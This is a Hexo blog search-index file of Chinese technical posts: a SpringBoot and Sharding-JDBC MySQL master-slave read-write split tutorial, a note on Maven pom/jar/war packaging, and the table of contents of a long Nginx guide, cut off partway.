<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SpringBoot实现MySQL的主从复制</title>
    <link href="/2023/02/06/SpringBoot%E5%AE%9E%E7%8E%B0MySQL%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <url>/2023/02/06/SpringBoot%E5%AE%9E%E7%8E%B0MySQL%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="springboot实现mysql的主从复制"><a class="markdownIt-Anchor" href="#springboot实现mysql的主从复制"></a> SpringBoot实现MySQL的主从复制</h1><p><a href="http://xtwoy.github.io/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/">从零开始，通过docker实现MySQL主从复制</a></p><h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f141bcd96b9840bd8a4e1295055408a1.png" alt="在这里插入图片描述" /><br />难么如何去确定来的SQL应该分配到哪个库上，这个就要靠Sharding-jdbc框架来读写分离的分流处理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83f78cd07cd848de9c4b5abd422d4b91.png" alt="在这里插入图片描述" /></p><h3 id="实战"><a class="markdownIt-Anchor" href="#实战"></a> 实战</h3><p>步骤如下<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f72981dfa9204bab9545793d04bc2ed9.png" alt="在这里插入图片描述" /><br />导入Maven坐标</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sharding-jdbc-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0-RC1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>配置yml文件</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">ccTakeOut</span><br>  <span class="hljs-attr">shardingsphere:</span><br>    <span class="hljs-attr">datasource:</span><br>      <span class="hljs-attr">names:</span><br>        <span class="hljs-string">master,slave</span><br>      <span class="hljs-comment"># 主库（增删改操作）</span><br>      <span class="hljs-attr">master:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://你的虚拟机IP地址:3307/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>      <span class="hljs-comment"># 从数据源（读操作）</span><br>      <span class="hljs-attr">slave:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://你的虚拟机IP地址:3308/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">masterslave:</span><br>      <span class="hljs-comment"># 读写分离配置</span><br>      <span class="hljs-attr">load-balance-algorithm-type:</span> <span class="hljs-string">round_robin</span> <span class="hljs-comment">#轮询（如果有多个从库会轮询着读）</span><br>      <span class="hljs-comment"># 最终的数据源名称</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">dataSource</span><br>      <span class="hljs-comment"># 主库数据源名称</span><br>      <span class="hljs-attr">master-data-source-name:</span> <span class="hljs-string">master</span><br>      <span class="hljs-comment"># 从库数据源名称列表，多个逗号分隔</span><br>      <span class="hljs-attr">slave-data-source-names:</span> <span class="hljs-string">slave</span><br>    <span class="hljs-attr">props:</span><br>      <span class="hljs-attr">sql:</span><br>        <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#开启SQL显示，默认false</span><br>  <span class="hljs-attr">main:</span><br>    <span class="hljs-attr">allow-bean-definition-overriding:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#允许bean数据源覆盖</span><br><br><br></code></pre></td></tr></table></figure><p>​</p><p>解读一下yml配置<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7e5c203773a04fdd9b9a096659db9749.png" alt="在这里插入图片描述" /><br /><strong>允许Bean定义覆盖很重要</strong></p><h3 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h3><p>启动项目，可以看到，读写操作分别到达了不同的主机上<br />读写分离测试<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f647f0ab726e48f7a4ae0445970980d2.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd937b8b481946bba8325127319d22f9.png" alt="在这里插入图片描述" /></p>]]></content>
    
    
    <categories>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>MySQL</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maven三种打包 pom jar wardriver class</title>
    <link href="/2023/01/20/Maven%E4%B8%89%E7%A7%8D%E6%89%93%E5%8C%85%20pom%20jar%20war/"/>
    <url>/2023/01/20/Maven%E4%B8%89%E7%A7%8D%E6%89%93%E5%8C%85%20pom%20jar%20war/</url>
    
    <content type="html"><![CDATA[<h1 id="maven三种打包-pom-jar-war"><a class="markdownIt-Anchor" href="#maven三种打包-pom-jar-war"></a> Maven三种打包 pom jar war</h1><ol><li><p><code>&lt;packaging&gt;pom&lt;/packaging&gt;</code></p><p>在父级项目中的pom.xml文件使用的packaging配置一定为pom。父级的pom文件只作项目的子模块的整合，在maveninstall时不会生成jar/war压缩包。</p><p>可以通过标签来整合子模块的编译顺序（Maven引入依赖使用最短路径原则，例如a&lt;–b&lt;–c1.0<br />，d&lt;–e&lt;–f&lt;–c1.1，由于路径最短，最终引入的为c1.0；但路径长度相同时，则会引入先申明的依赖）。因此尽量将更加底层的service放在更先的位置优先加载依赖较为合适。<br />可以将一些子项目中共用的依赖或将其版本统一写到父级配置中，以便统一管理。<br />groupId, artifactId, version能直接从父级继承，减少子项目的pom配置。</p><p>pom的意思是项目里没有java代码，也不执行任何代码，只是为了 <strong>聚合工程或传递依赖用</strong> 的。所以并不会寻找配置文件，若想配置文件生效，改为jar。</p></li><li><p><code>&lt;packaging&gt;jar&lt;/packaging&gt;</code></p></li></ol><p>Jar包是最为常见的打包方式，当pom文件中没有设置packaging参数时，默认使用jar方式打包。  这种打包方式意味着在mavenbuild时会将这个项目中的所有java文件都进行编译形成.class文件，且按照原来的java文件层级结构放置，最终压缩为一个jar文件。<br />当我们使用mvn install命令的时候，能够发现在项目中与src文件夹同级新生成了一个target文件夹，这个文件夹内的classes文件夹即为刚才提到的编译后形成的文件夹。如下图所示，这是我自己的项目生成的target文件夹，而最下方的jar文件即为此文件夹的压缩版本。</p><ol start="3"><li><code>&lt;packaging&gt;war&lt;/packaging&gt;</code><br />war包与jar包非常相似，同样是编译后的.class文件按层级结构形成文件树后打包形成的压缩包。不同的是，它会将项目中依赖的所有jar包都放在WEB-INF/lib这个文件夹下<br />war包非常适合部署时使用，不再需要下载其他的依赖包，能够使用户拿到war包直接使用，因此它经常使用于微服务项目群中的入口项目的pom配置中</li></ol>]]></content>
    
    
    <categories>
      
      <category>Maven</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx</title>
    <link href="/2023/01/19/Nginx/"/>
    <url>/2023/01/19/Nginx/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#nginx%E7%AE%80%E4%BB%8B">Nginx简介</a><ul><li><a href="#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D">背景介绍</a><ul><li><a href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A">名词解释</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E6%AF%94">常见服务器对比</a><ul><li><a href="#iis">IIS</a></li><li><a href="#tomcat">Tomcat</a></li><li><a href="#apache">Apache</a></li><li><a href="#lighttpd">Lighttpd</a></li><li><a href="#%E5%85%B6%E4%BB%96%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8">其他的服务器</a></li><li><a href="#nginx%E7%9A%84%E4%BC%98%E7%82%B9">Nginx的优点</a><ul><li><a href="#1%E9%80%9F%E5%BA%A6%E6%9B%B4%E5%BF%AB-%E5%B9%B6%E5%8F%91%E6%9B%B4%E9%AB%98">(1)速度更快、并发更高</a></li><li><a href="#2%E9%85%8D%E7%BD%AE%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%80%A7%E5%BC%BA">(2)配置简单，扩展性强</a></li><li><a href="#3%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7">(3)高可靠性</a></li><li><a href="#4%E7%83%AD%E9%83%A8%E7%BD%B2">(4)热部署</a></li><li><a href="#5%E6%88%90%E6%9C%AC%E4%BD%8E-bsd%E8%AE%B8%E5%8F%AF%E8%AF%81">(5)成本低、BSD许可证</a></li></ul></li></ul></li><li><a href="#nginx%E7%9A%84%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD">Nginx的功能特性及常用功能</a><ul><li><a href="#%E5%9F%BA%E6%9C%AChttp%E6%9C%8D%E5%8A%A1">基本HTTP服务</a></li><li><a href="#%E9%AB%98%E7%BA%A7http%E6%9C%8D%E5%8A%A1">高级HTTP服务</a></li><li><a href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1">邮件服务</a></li><li><a href="#nginx%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97">Nginx常用的功能模块</a></li></ul></li></ul></li><li><a href="#nginx%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">Nginx环境准备</a><ul><li><a href="#nginx%E7%89%88%E6%9C%AC%E4%BB%8B%E7%BB%8D">Nginx版本介绍</a></li><li><a href="#%E8%8E%B7%E5%8F%96nginx%E6%BA%90%E7%A0%81">获取Nginx源码</a></li><li><a href="#%E5%87%86%E5%A4%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F">准备服务器系统</a></li><li><a href="#nginx%E5%AE%89%E8%A3%85%E6%96%B9%E5%BC%8F%E4%BB%8B%E7%BB%8D">Nginx安装方式介绍</a><br />*<ul><li><a href="#gcc%E7%BC%96%E8%AF%91%E5%99%A8">GCC编译器</a></li><li><a href="#pcre">PCRE</a></li><li><a href="#zlib">zlib</a></li><li><a href="#openssl">OpenSSL</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%80nginx%E7%9A%84%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85">方案一：Nginx的源码简单安装</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%BA%8Cyum%E5%AE%89%E8%A3%85">方案二：yum安装</a></li><li><a href="#%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E5%92%8Cyum%E5%AE%89%E8%A3%85%E7%9A%84%E5%B7%AE%E5%BC%82">源码简单安装和yum安装的差异：</a><ul><li><a href="#%E8%A7%A3%E5%8E%8Bnginx%E7%9B%AE%E5%BD%95">解压Nginx目录</a></li></ul></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%89nginx%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%8D%E6%9D%82%E5%AE%89%E8%A3%85">方案三:Nginx的源码复杂安装</a></li><li><a href="#%E6%96%B9%E6%A1%88%E5%9B%9B%E5%AE%9D%E5%A1%94%E5%AE%89%E8%A3%85">方案四:宝塔安装</a></li></ul></li><li><a href="#nginx%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90">Nginx目录结构分析</a><br />*</li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%81%9C%E5%91%BD%E4%BB%A4">Nginx服务器启停命令</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80nginx%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BF%A1%E5%8F%B7%E6%8E%A7%E5%88%B6">方式一:Nginx服务的信号控制</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Cnginx%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A7%E5%88%B6">方式二:Nginx的命令行控制</a></li></ul></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E5%92%8C%E6%96%B0%E5%A2%9E%E6%A8%A1%E5%9D%97">Nginx服务器版本升级和新增模块</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">环境准备</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%80%E4%BD%BF%E7%94%A8nginx%E6%9C%8D%E5%8A%A1%E4%BF%A1%E5%8F%B7%E8%BF%9B%E8%A1%8C%E5%8D%87%E7%BA%A7">方案一:使用Nginx服务信号进行升级</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%BA%8C%E4%BD%BF%E7%94%A8nginx%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E7%9A%84make%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90%E5%8D%87%E7%BA%A7">方案二:使用Nginx安装目录的make命令完成升级</a></li></ul></li></ul></li><li><a href="#nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Nginx核心配置文件结构</a><ul><li><a href="#%E5%85%A8%E5%B1%80%E5%9D%97">全局块</a><ul><li><a href="#user%E6%8C%87%E4%BB%A4">user指令</a></li><li><a href="#work-process%E6%8C%87%E4%BB%A4">work process指令</a></li><li><a href="#%E5%85%B6%E4%BB%96%E6%8C%87%E4%BB%A4">其他指令</a></li></ul></li><li><a href="#events%E5%9D%97">events块</a><ul><li><a href="#events%E6%8C%87%E4%BB%A4%E9%85%8D%E7%BD%AE%E5%AE%9E%E4%BE%8B">events指令配置实例</a></li></ul></li><li><a href="#http%E5%9D%97">http块</a><ul><li><a href="#%E5%AE%9A%E4%B9%89mime-type">定义MIME-Type</a></li><li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97">自定义服务日志</a></li><li><a href="#%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">其他配置指令</a></li></ul></li><li><a href="#server%E5%9D%97%E5%92%8Clocation%E5%9D%97">server块和location块</a></li></ul></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E5%AE%9E%E4%BE%8B">Nginx服务器基础配置实例</a></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E6%93%8D%E4%BD%9C%E7%9A%84%E9%97%AE%E9%A2%98">Nginx服务操作的问题</a></li><li><a href="#nginx%E9%85%8D%E7%BD%AE%E6%88%90%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1">Nginx配置成系统服务</a></li><li><a href="#nginx%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83">Nginx命令配置到系统环境</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E9%83%A8%E7%BD%B2">Nginx静态资源部署</a><ul><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%A6%82%E8%BF%B0">Nginx静态资源概述</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">Nginx静态资源的配置指令</a><ul><li><a href="#listen%E6%8C%87%E4%BB%A4">listen指令</a></li><li><a href="#server_name%E6%8C%87%E4%BB%A4">server_name指令</a><ul><li><a href="#%E5%8C%B9%E9%85%8D%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F">匹配执行顺序</a></li></ul></li><li><a href="#location%E6%8C%87%E4%BB%A4">location指令</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90%E7%9A%84%E7%9B%AE%E5%BD%95root-alias">设置请求资源的目录root / alias</a></li><li><a href="#index%E6%8C%87%E4%BB%A4">index指令</a></li><li><a href="#error_page%E6%8C%87%E4%BB%A4">error_page指令</a></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E4%BC%98%E5%8C%96%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95">静态资源优化配置语法</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9%E5%AE%9E%E6%88%98">Nginx静态资源压缩实战</a><ul><li><a href="#gzip%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">Gzip模块配置指令</a></li><li><a href="#gzip%E5%8E%8B%E7%BC%A9%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E4%BE%8B%E9%85%8D%E7%BD%AE">Gzip压缩功能的实例配置</a></li><li><a href="#gzip%E5%92%8Csendfile%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98">Gzip和sendfile共存问题</a><ul><li><a href="#gzip_static%E6%8C%87%E4%BB%A4">gzip_static指令</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97%E5%88%B0nginx%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4">添加模块到Nginx的实现步骤</a></li><li><a href="#gzip_static%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8">gzip_static测试使用</a></li></ul></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98%E5%A4%84%E7%90%86">静态资源的缓存处理</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BC%93%E5%AD%98">什么是缓存</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFweb%E7%BC%93%E5%AD%98">什么是web缓存</a></li><li><a href="#web%E7%BC%93%E5%AD%98%E7%9A%84%E7%A7%8D%E7%B1%BB">web缓存的种类</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98">浏览器缓存</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98">为什么要用浏览器缓存</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">浏览器缓存的执行流程</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">浏览器缓存相关指令</a><ul><li><a href="#expires%E6%8C%87%E4%BB%A4">expires指令</a></li><li><a href="#add_header%E6%8C%87%E4%BB%A4">add_header指令</a></li></ul></li></ul></li><li><a href="#nginx%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">Nginx的跨域问题解决</a><ul><li><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">同源策略</a></li><li><a href="#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98">跨域问题</a></li><li><a href="#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA">跨域问题的案例演示</a></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">解决方案</a></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E9%98%B2%E7%9B%97%E9%93%BE">静态资源防盗链</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%B5%84%E6%BA%90%E7%9B%97%E9%93%BE">什么是资源盗链</a></li><li><a href="#nginx%E9%98%B2%E7%9B%97%E9%93%BE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86">Nginx防盗链的实现原理：</a></li><li><a href="#%E9%92%88%E5%AF%B9%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E9%98%B2%E7%9B%97%E9%93%BE">针对目录进行防盗链</a></li></ul></li></ul></li><li><a href="#rewrite%E5%8A%9F%E8%83%BD%E9%85%8D%E7%BD%AE">Rewrite功能配置</a><ul><li><a href="#rewrite%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Rewrite的相关指令</a><ul><li><a href="#set%E6%8C%87%E4%BB%A4">set指令</a></li><li><a href="#rewrite%E5%B8%B8%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">Rewrite常用全局变量</a></li><li><a href="#if%E6%8C%87%E4%BB%A4">if指令</a></li><li><a href="#break%E6%8C%87%E4%BB%A4">break指令</a></li><li><a href="#return%E6%8C%87%E4%BB%A4">return指令</a></li><li><a href="#rewrite%E6%8C%87%E4%BB%A4">rewrite指令</a></li><li><a href="#rewrite_log%E6%8C%87%E4%BB%A4">rewrite_log指令</a></li></ul></li><li><a href="#rewrite%E7%9A%84%E6%A1%88%E4%BE%8B">Rewrite的案例</a><ul><li><a href="#%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC">域名跳转</a></li><li><a href="#%E5%9F%9F%E5%90%8D%E9%95%9C%E5%83%8F">域名镜像</a></li><li><a href="#%E7%8B%AC%E7%AB%8B%E5%9F%9F%E5%90%8D">独立域名</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0">目录自动添加&quot;/&quot;</a></li><li><a href="#%E5%90%88%E5%B9%B6%E7%9B%AE%E5%BD%95">合并目录</a></li><li><a href="#%E9%98%B2%E7%9B%97%E9%93%BE">防盗链</a></li></ul></li></ul></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%A6%82%E8%BF%B0">Nginx反向代理概述</a></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95">Nginx反向代理的配置语法</a><ul><li><a href="#proxy_pass">proxy_pass</a></li><li><a href="#proxy_set_header">proxy_set_header</a></li><li><a href="#proxy_redirect">proxy_redirect</a></li></ul></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98">Nginx反向代理实战</a><ul><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%80">Nginx反向代理实战一</a></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%BA%8C">Nginx反向代理实战二</a></li></ul></li><li><a href="#nginx%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6">Nginx的安全控制</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ssl%E5%AF%B9%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86">如何使用SSL对流量进行加密</a><ul><li><a href="#nginx%E6%B7%BB%E5%8A%A0ssl%E7%9A%84%E6%94%AF%E6%8C%81">nginx添加SSL的支持</a></li><li><a href="#nginx%E7%9A%84ssl%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Nginx的SSL相关指令</a></li><li><a href="#%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6">生成证书</a></li><li><a href="#%E5%BC%80%E5%90%AFssl%E5%AE%9E%E4%BE%8B">开启SSL实例</a></li></ul></li></ul></li><li><a href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%B3%BB%E7%BB%9F%E8%B0%83%E4%BC%98">反向代理系统调优</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%A6%82%E8%BF%B0">负载均衡概述</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B">负载均衡的原理及处理流程</a><ul><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E4%BD%9C%E7%94%A8">负载均衡的作用</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F">负载均衡常用的处理方式</a><br />*<ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E7%94%A8%E6%88%B7%E6%89%8B%E5%8A%A8%E9%80%89%E6%8B%A9">方式一:用户手动选择</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Cdns%E8%BD%AE%E8%AF%A2%E6%96%B9%E5%BC%8F">方式二:DNS轮询方式</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%89%E5%9B%9B%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">方式三:四/七层负载均衡</a></li><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">Nginx七层负载均衡</a><ul><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%8C%87%E4%BB%A4">Nginx七层负载均衡的指令</a><ul><li><a href="#upstream%E6%8C%87%E4%BB%A4">upstream指令</a></li><li><a href="#server%E6%8C%87%E4%BB%A4">server指令</a></li></ul></li><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B">Nginx七层负载均衡的实现流程</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%8A%B6%E6%80%81">负载均衡状态</a><ul><li><a href="#down">down</a></li><li><a href="#backup">backup</a></li><li><a href="#max_conns">max_conns</a></li><li><a href="#max_fails%E5%92%8Cfail_timeout">max_fails和fail_timeout</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5">负载均衡策略</a><ul><li><a href="#%E8%BD%AE%E8%AF%A2">轮询</a></li><li><a href="#weight%E5%8A%A0%E6%9D%83%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2">weight加权[加权轮询]</a></li><li><a href="#ip_hash">ip_hash</a></li><li><a 